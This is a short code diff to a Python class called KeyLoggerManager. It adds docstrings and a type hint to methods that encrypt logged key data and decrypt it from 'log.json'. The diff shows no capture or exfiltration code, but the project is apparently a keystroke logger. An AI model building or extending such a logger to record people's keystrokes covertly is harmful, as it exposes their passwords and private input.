@@ -26,11 +26,14 @@ class KeyLoggerManager:
     def stop_listening(self):
         """
          Stops listening to keyboard keys
-        :return:
         """
         self.service.stop_listening()
 
-    def encrypt(self):
+    def encrypt(self) -> dict:
+        """
+        Takes an unencrypted dictionary
+         and returns an encrypted dictionary
+        """
         temp_dict = dict()
         data = self.service.get_data()
         for key , val in data.items():
@@ -41,6 +44,10 @@ class KeyLoggerManager:
 
 
     def decrypt(self):
+        """
+        Takes an encrypted json file
+         and returns an unencrypted dictionary
+        """
         temp_dict = dict()
         data = self.writer.load('log.json')
         for key, val in data.items():
